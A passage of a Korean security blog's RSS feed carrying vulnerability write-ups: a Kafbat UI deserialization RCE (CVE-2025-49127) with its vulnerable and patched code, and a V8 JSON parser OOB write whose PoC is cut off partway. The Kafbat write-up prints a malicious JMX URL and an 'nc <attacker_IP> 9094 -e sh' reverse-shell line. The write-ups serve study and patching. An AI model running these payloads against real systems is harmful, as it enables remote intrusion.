&#xC2E4;&#xC2B5;&#xD558;&#xAE30;&#xAC00; &#xC870;&#xAE08; &#xC5B4;&#xB835;&#xACE0;, CTF &#xBB38;&#xC81C;&#xB85C; &#xACF5;&#xBD80;&#xD574;&#xBCF4;&#xACE0; &#xC2F6;&#xC73C;&#xC2E0; &#xBD84;&#xB4E4;&#xC740; &#xC544;&#xB798; &#xBB38;&#xC81C;&#xB4E4;&#xC744; &#xCC38;&#xACE0;&#xD558;&#xC2DC;&#xBA74; &#xB420; &#xAC83; &#xAC19;&#xC2B5;&#xB2C8;&#xB2E4;!</p><ul><li><strong>Hack.lu 2019 - no_risc_no_future</strong></li><li><strong>HackCTF - BabyMIPS</strong></li></ul><p>MIPS&#xC640; &#xAC19;&#xC740; RISC &#xC544;&#xD0A4;&#xD14D;&#xCC98;&#xB294; &#xCC98;&#xC74C;&#xC5D0;&#xB294; &#xB0AF;&#xC124;&#xC9C0;&#xB9CC;, &#xC544;&#xD0A4;&#xD14D;&#xCC98; &#xD2B9;&#xC131;&#xC5D0; &#xB530;&#xB978; &#xC775;&#xC2A4; &#xAFC0;&#xD301;(?)&#xC5D0; &#xC775;&#xC219;&#xD574;&#xC9C0;&#xBA74; &#xADF8;&#xB798;&#xB3C4; &#xD560;&#xB9CC; &#xD55C; &#xAC83; &#xAC19;&#xC2B5;&#xB2C8;&#xB2E4;! &#xCC98;&#xC74C; MIPS&#xC5D0;&#xC11C; &#xC775;&#xC2A4;&#xD50C;&#xB85C;&#xC787;&#xC744; &#xD558;&#xC2DC;&#xB294; &#xBD84;&#xB4E4;&#xC5D0;&#xAC8C; &#xC870;&#xAE08;&#xC774;&#xB098;&#xB9C8; &#xB3C4;&#xC6C0;&#xC774; &#xB418;&#xC5C8;&#xC73C;&#xBA74; &#xC88B;&#xACA0;&#xC2B5;&#xB2C8;&#xB2E4;!</p><p>&#xB2E4;&#xC74C;&#xC5D0;&#xB294; &#xB2E4;&#xB978; &#xC784;&#xBCA0;&#xB514;&#xB4DC; &#xC8FC;&#xC81C;&#xB85C; &#xB3CC;&#xC544;&#xC624;&#xB3C4;&#xB85D; &#xD558;&#xACA0;&#xC2B5;&#xB2C8;&#xB2E4;! &#xAC10;&#xC0AC;&#xD569;&#xB2C8;&#xB2E4;! &#x1F44B;&#x1F3FB;</p>]]></content:encoded>
      
      
      <category domain="https://hackyboiz.github.io/categories/Research/">Research</category>
      
      
      <category domain="https://hackyboiz.github.io/tags/newp1ayer48/">newp1ayer48</category>
      
      <category domain="https://hackyboiz.github.io/tags/Embedded/">Embedded</category>
      
      <category domain="https://hackyboiz.github.io/tags/MIPS/">MIPS</category>
      
      
      <comments>https://hackyboiz.github.io/2025/08/21/newp1ayer48/mips/ko/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>[하루한줄] CVE-2025-49127  : Kafbat UI의 Unsafe Deserialization로 인한 Remote Code Execution</title>
      <link>https://hackyboiz.github.io/2025/08/20/romi0x/1day1line0820/</link>
      <guid>https://hackyboiz.github.io/2025/08/20/romi0x/1day1line0820/</guid>
      <pubDate>Wed, 20 Aug 2025 08:00:00 GMT</pubDate>
      
        
        
      <description>&lt;h2 id=&quot;URL&quot;&gt;&lt;a href=&quot;#URL&quot; class=&quot;headerlink&quot; title=&quot;URL&quot;&gt;&lt;/a&gt;URL&lt;/h2&gt;&lt;ul&gt;
&lt;li&gt;&lt;p&gt;&lt;a href=&quot;https://blog.securelayer7.net/cve-2025-49127-kaf</description>
        
      
      
      
      <content:encoded><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><ul><li><p><a href="https://blog.securelayer7.net/cve-2025-49127-kafbat-ui-rce-vulnerability/">https://blog.securelayer7.net/cve-2025-49127-kafbat-ui-rce-vulnerability/</a></p></li><li><p><a href="https://github.com/kafbat/kafka-ui/security/advisories/GHSA-g3mf-c374-fgh2">https://github.com/kafbat/kafka-ui/security/advisories/GHSA-g3mf-c374-fgh2</a></p></li></ul><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a>Target</h2><ul><li><strong>Target Product</strong>: Kafbat UI 1.0.0</li><li><strong>Affected Versions</strong>: 1.1.0 &#xC774;&#xC0C1;</li></ul><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a>Explain</h2><p>CVE-2025-49127&#xB85C; &#xC601;&#xD5A5;&#xBC1B;&#xB294; &#xC81C;&#xD488;&#xC778; <strong><a href="https://github.com/kafbat/kafka-ui">Kafbat UI</a>&#xB294; Apache Kafka &#xD074;&#xB7EC;&#xC2A4;&#xD130; &#xAD00;&#xB9AC;&#xB97C; &#xC704;&#xD55C; &#xC6F9; &#xAE30;&#xBC18; &#xB300;&#xC2DC;&#xBCF4;&#xB4DC;</strong>&#xC785;&#xB2C8;&#xB2E4;.</p><p>&#xC9C1;&#xAD00;&#xC801;&#xC778; &#xC778;&#xD130;&#xD398;&#xC774;&#xC2A4;&#xB97C; &#xD1B5;&#xD574; Kafka &#xD658;&#xACBD;&#xC744; &#xBAA8;&#xB2C8;&#xD130;&#xB9C1;&#xD558;&#xACE0; &#xAD00;&#xB9AC;&#xD560; &#xC218; &#xC788;&#xB3C4;&#xB85D; &#xC9C0;&#xC6D0;&#xD558;&#xBA70;, &#xC8FC;&#xB85C; &#xB300;&#xADDC;&#xBAA8; &#xB370;&#xC774;&#xD130; &#xC2A4;&#xD2B8;&#xB9AC;&#xBC0D; &#xD658;&#xACBD;(&#xAE08;&#xC735;, IoT, &#xB85C;&#xADF8; &#xC218;&#xC9D1;, &#xBE45;&#xB370;&#xC774;&#xD130; &#xBD84;&#xC11D; &#xB4F1;)&#xC5D0;&#xC11C; &#xC0AC;&#xC6A9;&#xB429;&#xB2C8;&#xB2E4;. &#xD074;&#xB7EC;&#xC2A4;&#xD130; &#xAD00;&#xB9AC;, &#xD1A0;&#xD53D; &#xAD00;&#xB9AC;, &#xCEE8;&#xC288;&#xBA38; &#xADF8;&#xB8F9; &#xCD94;&#xC801; &#xB4F1; &#xB2E4;&#xC591;&#xD55C; &#xAE30;&#xB2A5;&#xC744; &#xC81C;&#xACF5;&#xD558;&#xC9C0;&#xB9CC;, &#xC774;&#xBC88; &#xCDE8;&#xC57D;&#xC810;&#xC740; <strong>&#xB3D9;&#xC801; &#xD074;&#xB7EC;&#xC2A4;&#xD130; &#xC124;&#xC815;(Dynamic Cluster Configuration) &#xAE30;&#xB2A5;</strong>&#xC5D0;&#xC11C; &#xBC1C;&#xC0DD;&#xD588;&#xC2B5;&#xB2C8;&#xB2E4;.</p><h3 id="&#xCDE8;&#xC57D;&#xC810;-&#xBC1C;&#xC0DD;-&#xBA54;&#xCEE4;&#xB2C8;&#xC998;"><a href="#&#xCDE8;&#xC57D;&#xC810;-&#xBC1C;&#xC0DD;-&#xBA54;&#xCEE4;&#xB2C8;&#xC998;" class="headerlink" title="&#xCDE8;&#xC57D;&#xC810; &#xBC1C;&#xC0DD; &#xBA54;&#xCEE4;&#xB2C8;&#xC998;"></a><strong>&#xCDE8;&#xC57D;&#xC810; &#xBC1C;&#xC0DD; &#xBA54;&#xCEE4;&#xB2C8;&#xC998;</strong></h3><p>&#xCDE8;&#xC57D;&#xC810;&#xC740; <strong>&#xD074;&#xB7EC;&#xC2A4;&#xD130;&#xC758; Metrics &#xC124;&#xC815;&#xC5D0;&#xC11C; type&#xC744; JMX&#xB85C; &#xC9C0;&#xC815;</strong>&#xD588;&#xC744; &#xB54C; &#xBC1C;&#xC0DD;&#xD569;&#xB2C8;&#xB2E4;.</p><h4 id="1-&#xC545;&#xC131;-Kafka-&#xBE0C;&#xB85C;&#xCEE4;-&#xAD6C;&#xC131;"><a href="#1-&#xC545;&#xC131;-Kafka-&#xBE0C;&#xB85C;&#xCEE4;-&#xAD6C;&#xC131;" class="headerlink" title="1. &#xC545;&#xC131; Kafka &#xBE0C;&#xB85C;&#xCEE4; &#xAD6C;&#xC131;"></a>1. &#xC545;&#xC131; Kafka &#xBE0C;&#xB85C;&#xCEE4; &#xAD6C;&#xC131;</h4><p>   &#xACF5;&#xACA9;&#xC790;&#xB294; &#xC545;&#xC131; Kafka &#xBE0C;&#xB85C;&#xCEE4;&#xB97C; &#xAD6C;&#xC131;&#xD558;&#xACE0;, &#xC774; &#xBE0C;&#xB85C;&#xCEE4;&#xC758; <code>advertised.listeners</code> &#xAC12;&#xC744; &#xC870;&#xC791;&#xD558;&#xC5EC; &#xC790;&#xC2E0;&#xC774; &#xC81C;&#xC5B4;&#xD558;&#xB294; JMX RMI &#xC5D4;&#xB4DC;&#xD3EC;&#xC778;&#xD2B8;&#xB97C; &#xB4F1;&#xB85D;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p>   &#xC5EC;&#xAE30;&#xC11C; <code>advertised.listeners</code>&#xB294; Kafka &#xBE0C;&#xB85C;&#xCEE4;&#xAC00; &#xD074;&#xB77C;&#xC774;&#xC5B8;&#xD2B8;(&#xC608;: Kafbat UI, &#xD504;&#xB85C;&#xB4C0;&#xC11C;/&#xCEE8;&#xC288;&#xBA38;)&#xC5D0;&#xAC8C; &#x201C;&#xC811;&#xC18D;&#xD560; &#xB54C; &#xC774; &#xC8FC;&#xC18C;&#xB85C; &#xC811;&#xC18D;&#xD558;&#xB77C;&#x201D; &#xB77C;&#xACE0; &#xC548;&#xB0B4;&#xD558;&#xB294; &#xC124;&#xC815;&#xC785;&#xB2C8;&#xB2E4;.</p><p>   &#xACF5;&#xACA9;&#xC790;&#xB294; &#xC774; &#xAC12;&#xC744; &#xC545;&#xC131; JMX &#xC8FC;&#xC18C;&#xB85C; &#xC9C0;&#xC815;&#xD560; &#xC218; &#xC788;&#xB294;&#xAC81;&#xB2C8;&#xB2E4;.</p><pre><code>service:jmx:rmi:///jndi/rmi://&lt;&#xACF5;&#xACA9;&#xC790;_IP&gt;:&lt;&#xD3EC;&#xD2B8;&gt;/jmxrmi</code></pre><p>   &#xADF8;&#xB7FC;, &#xAD00;&#xB9AC;&#xC790;&#xB294; &#xC0C8;&#xB85C;&#xC6B4; &#xD074;&#xB7EC;&#xC2A4;&#xD130;&#xB97C; Kafbat UI&#xC5D0; &#xB4F1;&#xB85D;&#xD558;&#xBA74;&#xC11C; &#xACF5;&#xACA9;&#xC790;&#xAC00; &#xC9C0;&#xC815;&#xD55C; JVM &#xC11C;&#xBC84;&#xB85C; &#xC790;&#xB3D9;&#xC73C;&#xB85C; &#xC5F0;&#xACB0;&#xB429;&#xB2C8;&#xB2E4;.</p><h4 id="2-&#xC9C1;&#xB82C;&#xD654;&#xB41C;-&#xAC1D;&#xCCB4;-&#xAD50;&#xD658;"><a href="#2-&#xC9C1;&#xB82C;&#xD654;&#xB41C;-&#xAC1D;&#xCCB4;-&#xAD50;&#xD658;" class="headerlink" title="2. &#xC9C1;&#xB82C;&#xD654;&#xB41C; &#xAC1D;&#xCCB4; &#xAD50;&#xD658;"></a>2. &#xC9C1;&#xB82C;&#xD654;&#xB41C; &#xAC1D;&#xCCB4; &#xAD50;&#xD658;</h4><p>   JMX&#xB294; &#xB0B4;&#xBD80;&#xC801;&#xC73C;&#xB85C; Java RMI(Remote Method Invocation) &#xD504;&#xB85C;&#xD1A0;&#xCF5C;&#xC744; &#xC0AC;&#xC6A9;&#xD558;&#xBA70;, &#xC774; &#xACFC;&#xC815;&#xC5D0;&#xC11C; &#xC9C1;&#xB82C;&#xD654;&#xB41C; &#xAC1D;&#xCCB4;(Serialized Object)&#xB97C; &#xAD50;&#xD658;&#xD569;&#xB2C8;&#xB2E4;. </p><p>   &#xACF5;&#xACA9;&#xC790;&#xAC00; &#xC870;&#xC791;&#xD55C; JMX &#xC11C;&#xBC84;&#xB294; CommonsCollections &#xB4F1;&#xC758; &#xAC00;&#xC82F; &#xCCB4;&#xC778;(Gadget Chain)&#xC774; &#xD3EC;&#xD568;&#xB41C; &#xC545;&#xC131; &#xC9C1;&#xB82C;&#xD654; &#xD398;&#xC774;&#xB85C;&#xB4DC;&#xB97C; &#xBC18;&#xD658;&#xD569;&#xB2C8;&#xB2E4;.</p><h4 id="3-&#xC5ED;&#xC9C1;&#xB82C;&#xD654;-&#x2192;-&#xC6D0;&#xACA9;-&#xCF54;&#xB4DC;-&#xC2E4;&#xD589;"><a href="#3-&#xC5ED;&#xC9C1;&#xB82C;&#xD654;-&#x2192;-&#xC6D0;&#xACA9;-&#xCF54;&#xB4DC;-&#xC2E4;&#xD589;" class="headerlink" title="3. &#xC5ED;&#xC9C1;&#xB82C;&#xD654; &#x2192; &#xC6D0;&#xACA9; &#xCF54;&#xB4DC; &#xC2E4;&#xD589;"></a>3. &#xC5ED;&#xC9C1;&#xB82C;&#xD654; &#x2192; &#xC6D0;&#xACA9; &#xCF54;&#xB4DC; &#xC2E4;&#xD589;</h4><p>   Kafbat UI&#xB294; &#xC774; &#xAC1D;&#xCCB4;&#xB97C; &#xC2E0;&#xB8B0;&#xD558;&#xACE0; &#xC5ED;&#xC9C1;&#xB82C;&#xD654;&#xD558;&#xBA74;&#xC11C;, &#xACF5;&#xACA9;&#xC790;&#xAC00; &#xC2EC;&#xC5B4;&#xB454; &#xBA85;&#xB839;&#xC744; &#xC2E4;&#xD589;&#xD558;&#xAC8C; &#xB429;&#xB2C8;&#xB2E4;</p><pre><code>Runtime.getRuntime().exec(&quot;nc &lt;&#xACF5;&#xACA9;&#xC790;_IP&gt; 9094 -e sh&quot;);</code></pre><p>   &#xACB0;&#xACFC;&#xC801;&#xC73C;&#xB85C;, &#xACF5;&#xACA9;&#xC790;&#xB294; Kafbat UI &#xC11C;&#xBC84;&#xC758; &#xD504;&#xB85C;&#xC138;&#xC2A4; &#xAD8C;&#xD55C;&#xC73C;&#xB85C; &#xBA85;&#xB839;&#xC744; &#xC2E4;&#xD589;&#xD560; &#xC218; &#xC788;&#xAC8C; &#xB429;&#xB2C8;&#xB2E4;.</p><h3 id="&#xCDE8;&#xC57D;-&#xCF54;&#xB4DC;"><a href="#&#xCDE8;&#xC57D;-&#xCF54;&#xB4DC;" class="headerlink" title="&#xCDE8;&#xC57D; &#xCF54;&#xB4DC;"></a>&#xCDE8;&#xC57D; &#xCF54;&#xB4DC;</h3><p>&#xB2E4;&#xC74C; &#xCF54;&#xB4DC;&#xB294; Kafbat UI 1.0&#xC758; <code>JmxMetricsRetriever.java</code> &#xC77C;&#xBD80;&#xC785;&#xB2C8;&#xB2E4;.</p><pre><code class="hljs reasonml">@SneakyThrows<span class="hljs-keyword">private</span> List&lt;RawMetric&gt; retrieve<span class="hljs-constructor">Sync(KafkaCluster <span class="hljs-params">c</span>, Node <span class="hljs-params">node</span>)</span> {    String jmxUrl = <span class="hljs-string">&quot;service:jmx:rmi:///jndi/rmi://&quot;</span>        + node.host<span class="hljs-literal">()</span> + <span class="hljs-string">&quot;:&quot;</span>         + c.get<span class="hljs-constructor">MetricsConfig()</span>.get<span class="hljs-constructor">Port()</span>         + <span class="hljs-string">&quot;/jmxrmi&quot;</span>;    <span class="hljs-keyword">with</span><span class="hljs-constructor">JmxConnector(<span class="hljs-params">jmxUrl</span>, <span class="hljs-params">c</span>, <span class="hljs-params">jmxConnector</span> -&gt; <span class="hljs-params">getMetricsFromJmx</span>(<span class="hljs-params">jmxConnector</span>, <span class="hljs-params">result</span>)</span>);    return result;}</code></pre><p>&#xC774; &#xCF54;&#xB4DC;&#xC758; &#xBB38;&#xC81C;&#xB294; <code>node.host()</code>&#xC640; <code>metricsConfig.port</code> &#xAC12;&#xC774; &#xC678;&#xBD80;&#xC5D0;&#xC11C; &#xC785;&#xB825;&#xB41C; &#xAC12;&#xC5D0; &#xC758;&#xD574; &#xADF8;&#xB300;&#xB85C; &#xC81C;&#xC5B4;&#xB420; &#xC218; &#xC788;&#xB2E4;&#xB294; &#xC810;&#xC785;&#xB2C8;&#xB2E4;. &#xB610;&#xD55C;, &#xC774; &#xAC12;&#xB4E4;&#xC5D0; &#xB300;&#xD574; &#xBCC4;&#xB3C4;&#xC758; URL &#xAC80;&#xC99D;&#xC774;&#xB098; &#xD544;&#xD130;&#xB9C1; &#xACFC;&#xC815;&#xC774; &#xC5C6;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p>&#xACB0;&#xAD6D; <code>JMXConnectorFactory.newJMXConnector</code>&#xAC00; &#xD638;&#xCD9C;&#xB420; &#xB54C;, &#xACF5;&#xACA9;&#xC790;&#xAC00; &#xC758;&#xB3C4;&#xC801;&#xC73C;&#xB85C; &#xC870;&#xC791;&#xD55C; JMX &#xC11C;&#xBC84; &#xC8FC;&#xC18C;&#xB85C; &#xC5F0;&#xACB0;&#xC744; &#xC2DC;&#xB3C4;&#xD558;&#xAC8C; &#xB418;&#xACE0;, &#xADF8; &#xACFC;&#xC815;&#xC5D0;&#xC11C; &#xBC18;&#xD658;&#xB418;&#xB294; &#xC9C1;&#xB82C;&#xD654; &#xAC1D;&#xCCB4;&#xB97C; &#xC544;&#xBB34;&#xB7F0; &#xAC80;&#xC99D; &#xC5C6;&#xC774; &#xC5ED;&#xC9C1;&#xB82C;&#xD654;&#xD558;&#xAC8C; &#xB429;&#xB2C8;&#xB2E4;. &#xC774; &#xB54C;&#xBB38;&#xC5D0; &#xACF5;&#xACA9;&#xC790;&#xAC00; &#xB9CC;&#xB4E0; &#xC545;&#xC131; &#xD398;&#xC774;&#xB85C;&#xB4DC;&#xAC00; &#xADF8;&#xB300;&#xB85C; &#xC2E4;&#xD589;&#xB418;&#xBA70; RCE&#xB85C; &#xC774;&#xC5B4;&#xC9C0;&#xB294; &#xAC83;&#xC785;&#xB2C8;&#xB2E4;.</p><h3 id="&#xD328;&#xCE58;-&#xCF54;&#xB4DC;"><a href="#&#xD328;&#xCE58;-&#xCF54;&#xB4DC;" class="headerlink" title="&#xD328;&#xCE58; &#xCF54;&#xB4DC;"></a>&#xD328;&#xCE58; &#xCF54;&#xB4DC;</h3><p>&#xD328;&#xCE58;&#xB41C; &#xCF54;&#xB4DC;&#xB97C; &#xBCF4;&#xBA74; <strong>JMX &#xC5D4;&#xB4DC;&#xD3EC;&#xC778;&#xD2B8; &#xAC80;&#xC99D;&#xC774; &#xCD94;&#xAC00;</strong>&#xB410;&#xC2B5;&#xB2C8;&#xB2E4;.</p><pre><code class="hljs reasonml"><span class="hljs-keyword">if</span> (!is<span class="hljs-constructor">SafeJmxEndpoint(<span class="hljs-params">node</span>.<span class="hljs-params">host</span>()</span>, c.get<span class="hljs-constructor">MetricsConfig()</span>.get<span class="hljs-constructor">Port()</span>)) {    throw <span class="hljs-keyword">new</span> <span class="hljs-constructor">ValidationException(<span class="hljs-string">&quot;Invalid JMX endpoint&quot;</span>)</span>;}<span class="hljs-keyword">try</span> (JMXConnector connector =         <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">JMXConnectorFactory</span>.</span></span><span class="hljs-keyword">new</span><span class="hljs-constructor">JMXConnector(<span class="hljs-params">new</span> JMXServiceURL(<span class="hljs-params">jmxUrl</span>)</span>, env)) {    connector.connect(env);    consumer.accept(connector);}</code></pre><p>&#xB610;&#xD55C; &#xAE30;&#xBCF8; &#xC124;&#xC815;&#xC5D0;&#xC11C; <code>DYNAMIC_CONFIG_ENABLED=false</code> &#xAC00; &#xC801;&#xC6A9;&#xB418;&#xB3C4;&#xB85D; &#xBCC0;&#xACBD;&#xD558;&#xC5EC;, &#xBCC4;&#xB3C4; &#xC124;&#xC815; &#xC5C6;&#xC774;&#xB294; &#xB3D9;&#xC801; &#xD074;&#xB7EC;&#xC2A4;&#xD130; &#xCD94;&#xAC00;&#xAC00; &#xBD88;&#xAC00;&#xB2A5;&#xD558;&#xB3C4;&#xB85D; &#xBCC0;&#xACBD;&#xB410;&#xC2B5;&#xB2C8;&#xB2E4;.</p><h2 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h2><p><a href="https://github.com/kafbat/kafka-ui/releases/tag/v1.1.0">https://github.com/kafbat/kafka-ui/releases/tag/v1.1.0</a></p>]]></content:encoded>
      
      
      <category domain="https://hackyboiz.github.io/categories/1day1line/">1day1line</category>
      
      
      <category domain="https://hackyboiz.github.io/tags/RCE/">RCE</category>
      
      <category domain="https://hackyboiz.github.io/tags/romi0x/">romi0x</category>
      
      <category domain="https://hackyboiz.github.io/tags/Kafbat/">Kafbat</category>
      
      <category domain="https://hackyboiz.github.io/tags/Kafbat-UI/">Kafbat UI</category>
      
      <category domain="https://hackyboiz.github.io/tags/Unsafe-Deserialization/">Unsafe Deserialization</category>
      
      
      <comments>https://hackyboiz.github.io/2025/08/20/romi0x/1day1line0820/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>[하루한줄] Issue 396446145 : V8 json parser의 OOB write로 인한 V8 sandbox escape 취약점</title>
      <link>https://hackyboiz.github.io/2025/08/19/d4tura/2025-08-19/</link>
      <guid>https://hackyboiz.github.io/2025/08/19/d4tura/2025-08-19/</guid>
      <pubDate>Tue, 19 Aug 2025 09:00:00 GMT</pubDate>
      
        
        
      <description>&lt;h2 id=&quot;URL&quot;&gt;&lt;a href=&quot;#URL&quot; class=&quot;headerlink&quot; title=&quot;URL&quot;&gt;&lt;/a&gt;URL&lt;/h2&gt;&lt;ul&gt;
&lt;li&gt;&lt;a href=&quot;https://issues.chromium.org/issues/396446145&quot;&gt;https</description>
        
      
      
      
      <content:encoded><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><ul><li><a href="https://issues.chromium.org/issues/396446145">https://issues.chromium.org/issues/396446145</a></li></ul><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a>Target</h2><ul><li>Chrome version &lt; 137.0.7137.0</li></ul><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a>Explain</h2><p>v8&#xC5D0;&#xC11C; <a href="https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/JSON/parse">JSON.parse</a> &#xD568;&#xC218;&#xB85C;  <code>&apos;{&quot;result&quot;:true, &quot;count&quot;:42}&apos;</code> &#xAC19;&#xC774; &#x201C;result&#x201D;, &#x201C;conut&#x201D; &#xAC19;&#xC740; string data&#xAC00; &#xD3EC;&#xD568;&#xB41C; JSON &#xBB38;&#xC790;&#xC5F4;&#xC744; &#xCC98;&#xB9AC;&#xD560;&#xB54C; escape character&#xC778; &#xBC31;&#xC2AC;&#xB798;&#xC2DC;( <code>\\</code>) &#xAC00; &#xD3EC;&#xD568;&#xB41C; &#xBB38;&#xC790;&#xC5F4;&#xC774; &#xC788;&#xC744; &#xACBD;&#xC6B0;, &#xC544;&#xB798;&#xC640; &#xAC19;&#xC740; &#xCF5C;&#xC2A4;&#xD0DD;&#xC744; &#xAC70;&#xCCD0; <code>JsonParser&lt;Char&gt;::DecodeString</code> &#xD568;&#xC218;&#xAC00; &#xD638;&#xCD9C;&#xB429;&#xB2C8;&#xB2E4;.</p><p><a href="https://source.chromium.org/chromium/chromium/src/+/refs/tags/137.0.7136.1:v8/src/json/json-parser.h;l=165;bpv=1;bpt=0">JsonParser::Parse</a></p><p>&#x2192; <a href="https://source.chromium.org/chromium/chromium/src/+/refs/tags/137.0.7136.1:v8/src/json/json-parser.cc;l=532;bpv=1;bpt=0">JsonParser<char>::ParseJson</char></a></p><p>&#x2192; <a href="https://source.chromium.org/chromium/chromium/src/+/main:v8/src/json/json-parser.cc;l=1847;drc=c75642d079627158765ffca787e9a60d6a657ca5;bpv=1;bpt=1">JsonParser<char>::</char></a><a href="https://source.chromium.org/chromium/chromium/src/+/refs/tags/137.0.7136.1:v8/src/json/json-parser.cc;l=1634;bpv=1;bpt=0">ParseJsonValue</a></p><p>&#x2192; <a href="https://source.chromium.org/chromium/chromium/src/+/refs/tags/137.0.7136.1:v8/src/json/json-parser.cc;l=2115;bpv=1;bpt=0">JsonParser<char>::MakeString</char></a></p><p>&#x2192; <a href="https://source.chromium.org/chromium/chromium/src/+/refs/tags/137.0.7136.1:v8/src/json/json-parser.cc;l=2156;bpv=1;bpt=0">JsonParser<char>::DecodeString</char></a> </p><pre><code class="hljs cpp"><span class="hljs-keyword">template</span> &lt;<span class="hljs-keyword">typename</span> Char&gt;<span class="hljs-keyword">template</span> &lt;<span class="hljs-keyword">bool</span> should_track_json_source&gt;MaybeHandle&lt;Object&gt; JsonParser&lt;Char&gt;::ParseJsonValue() {  <span class="hljs-built_in">std</span>::<span class="hljs-built_in">vector</span>&lt;JsonContinuation&gt; cont_stack;  <span class="hljs-comment">// ....</span>          <span class="hljs-keyword">case</span> JsonToken::STRING:          Consume(JsonToken::STRING);          value = MakeString(ScanJsonString(<span class="hljs-literal">false</span>)); <span class="hljs-comment">// &lt;-- here</span>          <span class="hljs-function"><span class="hljs-keyword">if</span> <span class="hljs-title">constexpr</span> <span class="hljs-params">(should_track_json_source)</span> </span>{            end_position = position();            val_node = isolate_-&gt;factory()-&gt;NewSubString(                source_, start_position, end_position);          }          <span class="hljs-keyword">break</span>;          .....<span class="hljs-keyword">template</span> &lt;<span class="hljs-keyword">typename</span> Char&gt;Handle&lt;String&gt; JsonParser&lt;Char&gt;::MakeString(<span class="hljs-keyword">const</span> JsonString&amp; <span class="hljs-built_in">string</span>,                                            Handle&lt;String&gt; hint) {  <span class="hljs-keyword">if</span> (<span class="hljs-built_in">string</span>.length() == <span class="hljs-number">0</span>) <span class="hljs-keyword">return</span> factory()-&gt;empty_string();  <span class="hljs-keyword">if</span> (<span class="hljs-built_in">string</span>.length() == <span class="hljs-number">1</span>) {    <span class="hljs-keyword">uint16_t</span> first_char;    <span class="hljs-keyword">if</span> (!<span class="hljs-built_in">string</span>.has_escape()) {      first_char = chars_[<span class="hljs-built_in">string</span>.start()];    } <span class="hljs-keyword">else</span> {    <span class="hljs-comment">//</span>    <span class="hljs-comment">// here</span>    <span class="hljs-comment">//</span>      DecodeString(&amp;first_char, <span class="hljs-built_in">string</span>.start(), <span class="hljs-number">1</span>);    }    <span class="hljs-keyword">return</span> factory()-&gt;LookupSingleCharacterStringFromCode(first_char);  }</code></pre><p><code>JsonParser&lt;Char&gt;::DecodeString</code>  &#xD568;&#xC218;&#xB294; length &#xCCB4;&#xD06C; &#xC5C6;&#xC774; &#xBC31;&#xC2AC;&#xB798;&#xC2DC; &#xBB38;&#xC790;&#xB97C; &#xCC3E;&#xC744;&#xB54C;&#xAE4C;&#xC9C0; &#xACC4;&#xC18D; &#xB8E8;&#xD504;&#xB97C; &#xBC18;&#xBCF5;&#xD558;&#xAE30; &#xB54C;&#xBB38;&#xC5D0;, &#xD574;&#xB2F9; loop&#xAC00; &#xC2E4;&#xD589;&#xC911;&#xC77C;&#xB54C; &#xB2E4;&#xB978; thread&#xC5D0;&#xC11C; &#xB514;&#xCF54;&#xB529; &#xC911;&#xC778; &#xBB38;&#xC790;&#xC5F4;&#xC744; &#xC218;&#xC815;&#xD574;&#xC11C; &#xBC31;&#xC2AC;&#xB798;&#xC26C;&#xB97C; &#xC9C0;&#xC6CC;&#xBC84;&#xB9AC;&#xBA74; OOB write&#xAC00; &#xBC1C;&#xC0DD;&#xD569;&#xB2C8;&#xB2E4;.</p><pre><code class="hljs cpp"><span class="hljs-keyword">void</span> JsonParser&lt;Char&gt;::DecodeString(SinkChar* sink, <span class="hljs-keyword">uint32_t</span> start,                                    <span class="hljs-keyword">uint32_t</span> length) {  SinkChar* sink_start = sink;  <span class="hljs-keyword">const</span> Char* cursor = chars_ + start;  <span class="hljs-keyword">while</span> (<span class="hljs-literal">true</span>) {    <span class="hljs-keyword">const</span> Char* end = cursor + length - (sink - sink_start);    cursor = <span class="hljs-built_in">std</span>::find_if(cursor, end, [&amp;sink](Char c) {      <span class="hljs-keyword">if</span> (c == <span class="hljs-string">&apos;\\&apos;</span>) <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;      *sink++ = c;      <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;    });</code></pre><h3 id="PoC"><a href="#PoC" class="headerlink" title="PoC"></a>PoC</h3><p><a href="https://issues.chromium.org/action/issues/396446145/attachments/62924832?download=false">&#xC6D0;&#xBCF8; PoC &#xCF54;&#xB4DC;</a>&#xB97C; &#xBCF4;&#xC2DC;&#xBA74; <a href="https://developer.mozilla.org/en-US/docs/Web/API/Worker/Worker">Worker &#xC0DD;&#xC131;&#xC790;</a>&#xB97C; &#xD1B5;&#xD574; background task thread&#xB97C; &#xC0DD;&#xC131; &#xD6C4;, <a href="https://chromium.googlesource.com/v8/v8.git/+/refs/heads/main/src/sandbox/README.md">Sandbox API</a> &#xB97C; &#xC0AC;&#xC6A9;&#xD574; <code>JSON.parse</code> &#xC5D0;&#xC11C; &#xD30C;&#xC2F1;&#xC911;&#xC778; &#xBB38;&#xC790;&#xC5F4;&#xC758; &#xBA54;&#xBAA8;&#xB9AC;&#xC5D0; &#xC9C1;&#xC811; &#xC811;&#xADFC; &#xD6C4; &#xAC12;&#xC744; &#xBCC0;&#xACBD;&#xD558;&#xB294; &#xBC29;&#xC2DD;&#xC73C;&#xB85C; OOB  write &#xCDE8;&#xC57D;&#xC810;&#xC744; &#xD2B8;&#xB9AC;&#xAC70; &#xD569;&#xB2C8;&#xB2E4;.</p><pre><code class="hljs jsx"><span class="hljs-keyword">let</span> sbx_memory = <span class="hljs-keyword">new</span> <span class="hljs-built_in">DataView</span>(<span class="hljs-keyword">new</span> Sandbox.MemoryView(<span class="hljs-number">0</span>, <span class="hljs-number">0x100000000</span>));<span class="hljs-keyword">const</span> v9 = <span class="hljs-built_in">String</span>.fromCodePoint(<span class="hljs-number">6</span>);<span class="hljs-keyword">const</span> v14 = <span class="hljs-built_in">JSON</span>.stringify(v9);<span class="hljs-function"><span class="hljs-keyword">function</span> <span 